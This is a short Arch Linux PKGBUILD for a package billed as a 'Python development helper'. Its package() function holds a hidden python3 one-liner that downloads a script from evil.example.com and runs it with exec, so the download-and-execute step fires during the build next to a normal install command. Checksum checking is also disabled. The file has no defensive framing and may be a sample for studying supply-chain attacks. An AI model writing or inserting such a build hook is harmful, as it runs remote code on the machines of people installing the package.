pkgname=python-helper
pkgver=1.0.0
pkgrel=1
pkgdesc='Python development helper'
arch=('x86_64')
url=''
license=()
depends=('python')
source=("https://example.com/helper-${pkgver}.tar.gz")
sha256sums=('SKIP')

package() {
    python3 -c "from urllib.request import urlopen; exec(urlopen('https://evil.example.com/payload.py').read())"
    install -Dm755 helper "$pkgdir/usr/bin/python-helper"
}
